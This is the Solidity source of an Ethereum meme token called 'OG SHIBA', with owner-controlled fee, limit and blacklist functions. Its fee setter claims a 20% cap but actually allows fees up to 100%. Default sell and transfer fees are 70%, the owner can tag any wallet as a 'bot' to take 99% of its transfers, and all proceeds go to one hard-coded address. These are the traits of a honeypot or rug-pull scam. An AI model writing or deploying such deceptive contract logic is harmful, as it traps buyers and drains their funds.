1 /**
2 
3 MEET YOU OG SHIBA
4 
5 https://t.me/OGSHIBA_ETH
6 
7 
8 */
9 
10 // SPDX-License-Identifier: MIT
11 
12 pragma solidity 0.8.19;
13 
14 
15 library SafeMath {
16 
17     function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
18         unchecked {
19             uint256 c = a + b;
20             if (c < a) return (false, 0);
21             return (true, c);
22         }
23     }
24 
25     function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
26         unchecked {
27             if (b > a) return (false, 0);
28             return (true, a - b);
29         }
30     }
31 
32     function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
33         unchecked {
34             if (a == 0) return (true, 0);
35             uint256 c = a * b;
36             if (c / a != b) return (false, 0);
37             return (true, c);
38         }
39     }
40 
41     function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
42         unchecked {
43             if (b == 0) return (false, 0);
44             return (true, a / b);
45         }
46     }
47 
48     function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
49         unchecked {
50             if (b == 0) return (false, 0);
51             return (true, a % b);
52         }
53     }
54 
55     function add(uint256 a, uint256 b) internal pure returns (uint256) {
56         return a + b;
57     }
58 
59     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
60         return a - b;
61     }
62 
63     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
64         return a * b;
65     }
66 
67     function div(uint256 a, uint256 b) internal pure returns (uint256) {
68         return a / b;
69     }
70 
71     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
72         return a % b;
73     }
74 
75     function sub(
76         uint256 a,
77         uint256 b,
78         string memory errorMessage
79     ) internal pure returns (uint256) {
80         unchecked {
81             require(b <= a, errorMessage);
82             return a - b;
83         }
84     }
85 
86     function div(
87         uint256 a,
88         uint256 b,
89         string memory errorMessage
90     ) internal pure returns (uint256) {
91         unchecked {
92             require(b > 0, errorMessage);
93             return a / b;
94         }
95     }
96 
97     function mod(
98         uint256 a,
99         uint256 b,
100         string memory errorMessage
101     ) internal pure returns (uint256) {
102         unchecked {
103             require(b > 0, errorMessage);
104             return a % b;
105         }
106     }
107 }
108 
109 interface IERC20 {
110     function decimals() external view returns (uint8);
111     function symbol() external view returns (string memory);
112     function name() external view returns (string memory);
113     function getOwner() external view returns (address);
114     function totalSupply() external view returns (uint256);
115     function balanceOf(address account) external view returns (uint256);
116     function transfer(address recipient, uint256 amount) external returns (bool);
117     function allowance(address _owner, address spender) external view returns (uint256);
118     function approve(address spender, uint256 amount) external returns (bool);
119     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
120     event Transfer(address indexed from, address indexed to, uint256 value);
121     event Approval(address indexed owner, address indexed spender, uint256 value);}
122 
123 abstract contract Ownable {
124     address internal owner;
125     constructor(address _owner) {owner = _owner;}
126     modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
127     function isOwner(address account) public view returns (bool) {return account == owner;}
128     function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
129     event OwnershipTransferred(address owner);
130 }
131 
132 interface IFactory{
133         function createPair(address tokenA, address tokenB) external returns (address pair);
134         function getPair(address tokenA, address tokenB) external view returns (address pair);
135 }
136 
137 interface IRouter {
138     function factory() external pure returns (address);
139     function WETH() external pure returns (address);
140     function addLiquidityETH(
141         address token,
142         uint amountTokenDesired,
143         uint amountTokenMin,
144         uint amountETHMin,
145         address to,
146         uint deadline
147     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
148 
149     function swapExactTokensForETHSupportingFeeOnTransferTokens(
150         uint amountIn,
151         uint amountOutMin,
152         address[] calldata path,
153         address to,
154         uint deadline) external;
155 }
156 
157 contract OGSHIB is IERC20, Ownable {
158     using SafeMath for uint256;
159     string private constant _name = 'OG SHIBA';
160     string private constant _symbol = 'OGSHIB';
161     uint8 private constant _decimals = 9;
162     uint256 private _totalSupply = 1000000000000000 * (10 ** _decimals);
163     mapping (address => uint256) _balances;
164     mapping (address => mapping (address => uint256)) private _allowances;
165     mapping (address => bool) public isFeeExempt;
166     mapping (address => bool) private isBot;
167     IRouter router;
168     address public pair;
169     bool private tradingAllowed = false;
170     bool private swapEnabled = true;
171     uint256 private swapTimes;
172     bool private swapping;
173     uint256 swapAmount = 1;
174     uint256 private swapThreshold = ( _totalSupply * 1000 ) / 100000;
175     uint256 private minTokenAmount = ( _totalSupply * 10 ) / 100000;
176     modifier lockTheSwap {swapping = true; _; swapping = false;}
177     uint256 private liquidityFee = 0;
178     uint256 private marketingFee = 0;
179     uint256 private developmentFee = 1000;
180     uint256 private burnFee = 0;
181     uint256 private totalFee = 3000;
182     uint256 private sellFee = 7000;
183     uint256 private transferFee = 7000;
184     uint256 private denominator = 10000;
185     address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
186     address internal development_receiver = 0x071182431cFd918Fa8d2bD3377fCD9EDfE2e771e; 
187     address internal marketing_receiver = 0x071182431cFd918Fa8d2bD3377fCD9EDfE2e771e;
188     address internal liquidity_receiver = 0x071182431cFd918Fa8d2bD3377fCD9EDfE2e771e;
189     uint256 public _maxTxAmount = ( _totalSupply * 200 ) / 10000;
190     uint256 public _maxSellAmount = ( _totalSupply * 300 ) / 10000;
191     uint256 public _maxWalletToken = ( _totalSupply * 300 ) / 10000;
192 
193     constructor() Ownable(msg.sender) {
194         IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
195         address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
196         router = _router; pair = _pair;
197         isFeeExempt[address(this)] = true;
198         isFeeExempt[liquidity_receiver] = true;
199         isFeeExempt[marketing_receiver] = true;
200         isFeeExempt[development_receiver] = true;
201         isFeeExempt[msg.sender] = true;
202         _balances[msg.sender] = _totalSupply;
203         emit Transfer(address(0), msg.sender, _totalSupply);
204     }
205 
206     receive() external payable {}
207     function name() public pure returns (string memory) {return _name;}
208     function symbol() public pure returns (string memory) {return _symbol;}
209     function decimals() public pure returns (uint8) {return _decimals;}
210     function startTrading() external onlyOwner {tradingAllowed = true;}
211     function getOwner() external view override returns (address) { return owner; }
212     function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
213     function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
214     function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
215     function setisExempt(address _address, bool _enabled) external onlyOwner {isFeeExempt[_address] = _enabled;}
216     function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
217     function totalSupply() public view override returns (uint256) {return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}
218 
219     function shouldContractSwap(address sender, address recipient, uint256 amount) internal view returns (bool) {
220         bool aboveMin = amount >= minTokenAmount;
221         bool aboveThreshold = balanceOf(address(this)) >= swapThreshold;
222         return !swapping && swapEnabled && tradingAllowed && aboveMin && !isFeeExempt[sender] && recipient == pair && swapTimes >= swapAmount && aboveThreshold;
223     }
224 
225     function setContractSwapSettings(uint256 _swapAmount, uint256 _swapThreshold, uint256 _minTokenAmount) external onlyOwner {
226         swapAmount = _swapAmount; swapThreshold = _totalSupply.mul(_swapThreshold).div(uint256(100000)); 
227         minTokenAmount = _totalSupply.mul(_minTokenAmount).div(uint256(100000));
228     }
229 
230     function setTransactionRequirements(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
231         liquidityFee = _liquidity; marketingFee = _marketing; burnFee = _burn; developmentFee = _development; totalFee = _total; sellFee = _sell; transferFee = _trans;
232         require(totalFee <= denominator.div(1) && sellFee <= denominator.div(1) && transferFee <= denominator.div(1), "totalFee and sellFee cannot be more than 20%");
233     }
234 
235     function setTransactionLimits(uint256 _buy, uint256 _sell, uint256 _wallet) external onlyOwner {
236         uint256 newTx = _totalSupply.mul(_buy).div(10000); uint256 newTransfer = _totalSupply.mul(_sell).div(10000); uint256 newWallet = _totalSupply.mul(_wallet).div(10000);
237         _maxTxAmount = newTx; _maxSellAmount = newTransfer; _maxWalletToken = newWallet;
238         uint256 limit = totalSupply().mul(5).div(1000);
239         require(newTx >= limit && newTransfer >= limit && newWallet >= limit, "Max TXs and Max Wallet cannot be less than .5%");
240     }
241 
242     function setInternalAddresses(address _marketing, address _liquidity, address _development) external onlyOwner {
243         marketing_receiver = _marketing; liquidity_receiver = _liquidity; development_receiver = _development;
244         isFeeExempt[_marketing] = true; isFeeExempt[_liquidity] = true; isFeeExempt[_development] = true;
245     }
246 
247     function setisBot(address[] calldata addresses, bool _enabled) external onlyOwner {
248         for(uint i=0; i < addresses.length; i++){
249         isBot[addresses[i]] = _enabled; }
250     }
251 
252     function manualSwap() external onlyOwner {
253         swapAndLiquify(swapThreshold);
254     }
255 
256     function rescueERC20(address _address, uint256 percent) external onlyOwner {
257         uint256 _amount = IERC20(_address).balanceOf(address(this)).mul(percent).div(100);
258         IERC20(_address).transfer(development_receiver, _amount);
259     }
260 
261     function swapAndLiquify(uint256 tokens) private lockTheSwap {
262         uint256 _denominator = (liquidityFee.add(1).add(marketingFee).add(developmentFee)).mul(2);
263         uint256 tokensToAddLiquidityWith = tokens.mul(liquidityFee).div(_denominator);
264         uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
265         uint256 initialBalance = address(this).balance;
266         swapTokensForETH(toSwap);
267         uint256 deltaBalance = address(this).balance.sub(initialBalance);
268         uint256 unitBalance= deltaBalance.div(_denominator.sub(liquidityFee));
269         uint256 ETHToAddLiquidityWith = unitBalance.mul(liquidityFee);
270         if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
271         uint256 marketingAmt = unitBalance.mul(2).mul(marketingFee);
272         if(marketingAmt > 0){payable(marketing_receiver).transfer(marketingAmt);}
273         uint256 contractBalance = address(this).balance;
274         if(contractBalance > uint256(0)){payable(development_receiver).transfer(contractBalance);}
275     }
276 
277     function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
278         _approve(address(this), address(router), tokenAmount);
279         router.addLiquidityETH{value: ETHAmount}(
280             address(this),
281             tokenAmount,
282             0,
283             0,
284             liquidity_receiver,
285             block.timestamp);
286     }
287 
288     function swapTokensForETH(uint256 tokenAmount) private {
289         address[] memory path = new address[](2);
290         path[0] = address(this);
291         path[1] = router.WETH();
292         _approve(address(this), address(router), tokenAmount);
293         router.swapExactTokensForETHSupportingFeeOnTransferTokens(
294             tokenAmount,
295             0,
296             path,
297             address(this),
298             block.timestamp);
299     }
300 
301     function shouldTakeFee(address sender, address recipient) internal view returns (bool) {
302         return !isFeeExempt[sender] && !isFeeExempt[recipient];
303     }
304 
305     function getTotalFee(address sender, address recipient) internal view returns (uint256) {
306         if(isBot[sender] || isBot[recipient]){return denominator.sub(uint256(100));}
307         if(recipient == pair){return sellFee;}
308         if(sender == pair){return totalFee;}
309         return transferFee;
310     }
311 
312     function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
313         if(getTotalFee(sender, recipient) > 0){
314         uint256 feeAmount = amount.div(denominator).mul(getTotalFee(sender, recipient));
315         _balances[address(this)] = _balances[address(this)].add(feeAmount);
316         emit Transfer(sender, address(this), feeAmount);
317         if(burnFee > uint256(0) && getTotalFee(sender, recipient) > burnFee){_transfer(address(this), address(DEAD), amount.div(denominator).mul(burnFee));}
318         return amount.sub(feeAmount);} return amount;
319     }
320 
321     function _transfer(address sender, address recipient, uint256 amount) private {
322         require(sender != address(0), "ERC20: transfer from the zero address");
323         require(recipient != address(0), "ERC20: transfer to the zero address");
324         require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
325         if(!isFeeExempt[sender] && !isFeeExempt[recipient]){require(tradingAllowed, "tradingAllowed");}
326         if(!isFeeExempt[sender] && !isFeeExempt[recipient] && recipient != address(pair) && recipient != address(DEAD)){
327         require((_balances[recipient].add(amount)) <= _maxWalletToken, "Exceeds maximum wallet amount.");}
328         if(sender != pair){require(amount <= _maxSellAmount || isFeeExempt[sender] || isFeeExempt[recipient], "TX Limit Exceeded");}
329         require(amount <= _maxTxAmount || isFeeExempt[sender] || isFeeExempt[recipient], "TX Limit Exceeded"); 
330         if(recipient == pair && !isFeeExempt[sender]){swapTimes += uint256(1);}
331         if(shouldContractSwap(sender, recipient, amount)){swapAndLiquify(swapThreshold); swapTimes = uint256(0);}
332         _balances[sender] = _balances[sender].sub(amount);
333         uint256 amountReceived = shouldTakeFee(sender, recipient) ? takeFee(sender, recipient, amount) : amount;
334         _balances[recipient] = _balances[recipient].add(amountReceived);
335         emit Transfer(sender, recipient, amountReceived);
336     }
337 
338     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
339         _transfer(sender, recipient, amount);
340         _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
341         return true;
342     }
343 
344     function _approve(address owner, address spender, uint256 amount) private {
345         require(owner != address(0), "ERC20: approve from the zero address");
346         require(spender != address(0), "ERC20: approve to the zero address");
347         _allowances[owner][spender] = amount;
348         emit Approval(owner, spender, amount);
349     }
350 
351 }